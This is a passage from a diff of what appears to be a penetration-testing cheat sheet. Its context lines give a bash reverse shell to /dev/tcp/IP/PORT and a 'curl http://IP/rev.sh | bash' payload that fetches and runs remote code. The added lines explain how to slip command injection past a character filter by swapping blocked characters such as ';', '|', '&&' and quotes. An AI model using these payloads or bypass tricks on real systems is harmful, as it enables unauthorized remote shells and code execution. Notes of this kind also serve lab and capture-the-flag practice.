@@ -983,8 +983,8 @@ bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
 Then on the server side, use `curl http://IP/rev.sh | bash` 
 or similar tool as your injection payload.
 
-### Command injection payload choices
-Sometimes an application might have firewall or defences in-place,
+### Command injection payload with firewall evasion
+Sometimes an application might have firewall or defences in-place as a filter,
 it means some special characters might be blocked.
 Common command injection special characters are `;"|'&$`
 
@@ -992,6 +992,11 @@ If you found that an application consist of a firewall/defence,
 try and see which characters are banned and which are not.
 Sometimes it allows `'` but not `"`, vice versa.
 Sometimes it allows `;` but not `|`, vice versa.
+
+To test the banned characters, you can try changing the `'` in your 
+original payload to `"` and see if it can get through the filter.
+This can also apply to all special characters.
+Let's say if `;` is blocked, then you may try `|`, `||`, `&&`, etc.
 
 ### Starting a windows conptyshell in background (can use it via a web shell to call conptyshell directly)
 ```cmd
